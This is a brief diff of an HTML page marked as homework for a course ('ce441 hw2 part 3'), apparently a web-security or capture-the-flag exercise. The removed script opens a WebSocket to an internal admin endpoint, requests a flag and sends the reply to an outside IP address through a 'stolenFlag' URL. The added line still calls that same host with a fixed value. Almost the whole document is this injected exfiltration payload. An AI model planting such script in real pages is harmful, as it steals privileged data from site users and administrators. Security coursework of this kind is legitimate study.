@@ -3,12 +3,7 @@
     <body>
     this is ce441 hw2 part 3, v2
         <script>
-const ws = new WebSocket(`ws://web:8080/admin/ws`);
-ws.onopen = () => ws.send("flag");
-ws.onmessage = (event) => {
-  const response = event.data;
-  fetch(`http://188.121.97.131:80/stolenFlag?flag=${response}`);
-};
+            fetch(`http://188.121.97.131:80/stolenFlag?flag=4`);
         </script>
     </body>
 </html>
